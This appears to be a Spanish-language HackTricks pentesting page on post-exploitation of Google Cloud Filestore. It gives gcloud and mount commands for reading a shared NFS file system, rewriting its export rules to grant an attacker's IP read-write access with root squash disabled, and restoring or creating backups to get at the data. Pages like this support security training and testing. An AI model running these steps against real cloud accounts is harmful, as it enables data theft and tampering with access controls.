# GCP - Filestore Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Filestore

Para más información sobre Filestore consulta:

{{#ref}}
../gcp-services/gcp-filestore-enum.md
{{#endref}}

### Montar Filestore

Un sistema de archivos compartido **podría contener información sensible** de interés desde la perspectiva de un atacante. Con acceso a Filestore es posible **montarlo**:

<details>

<summary>Montar el sistema de archivos de Filestore</summary>
```bash
sudo apt-get update
sudo apt-get install nfs-common
# Check the share name
showmount -e <IP>
# Mount the share
mkdir /mnt/fs
sudo mount [FILESTORE_IP]:/[FILE_SHARE_NAME] /mnt/fs
```
</details>

Para encontrar la dirección IP de una instancia Filestore, consulta la sección enumeration de la página:

{{#ref}}
../gcp-services/gcp-filestore-enum.md
{{#endref}}

### Quitar restricciones y obtener permisos adicionales

Si el atacante no se encuentra en una dirección IP con acceso al recurso compartido, pero tienes permisos suficientes para modificarlo, es posible eliminar las restricciones de acceso sobre él. También es posible conceder más privilegios a tu dirección IP para obtener acceso de administrador al recurso compartido:

<details>

<summary>Actualizar instancia Filestore para permitir el acceso</summary>
```bash
gcloud filestore instances update nfstest \
--zone=<exact-zone> \
--flags-file=nfs.json

# Contents of nfs.json
{
"--file-share":
{
"capacity": "1024",
"name": "<share-name>",
"nfs-export-options": [
{
"access-mode": "READ_WRITE",
"ip-ranges": [
"<your-ip-private-address>/32"
],
"squash-mode": "NO_ROOT_SQUASH",
"anon_uid": 1003,
"anon_gid": 1003
}
]
}
}
```
</details>

### Restaurar una copia de seguridad

Si existe una copia de seguridad, es posible **restaurarla** en una instancia existente o en una nueva para que su **información sea accesible:**

<details>

<summary>Crear nueva instancia y restaurar la copia de seguridad</summary>
```bash
# Create a new filestore if you don't want to modify the old one
gcloud filestore instances create <new-instance-name> \
--zone=<zone> \
--tier=STANDARD \
--file-share=name=vol1,capacity=1TB \
--network=name=default,reserved-ip-range=10.0.0.0/29

# Restore a backups in a new instance
gcloud filestore instances restore <new-instance-name> \
--zone=<zone> \
--file-share=<instance-file-share-name> \
--source-backup=<backup-name> \
--source-backup-region=<backup-region>

# Follow the previous section commands to mount it
```
</details>

### Crear una copia de seguridad y restaurarla

Si **no tienes acceso al recurso compartido y no quieres modificarlo**, es posible **crear una copia de seguridad** del mismo y **restaurarla** como se indicó anteriormente:

<details>

<summary>Crear copia de seguridad y restaurarla en una nueva instancia</summary>
```bash
# Create share backup
gcloud filestore backups create <back-name> \
--region=<region> \
--instance=<instance-name> \
--instance-zone=<instance-zone> \
--file-share=<share-name>

# Follow the previous section commands to restore it and mount it
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
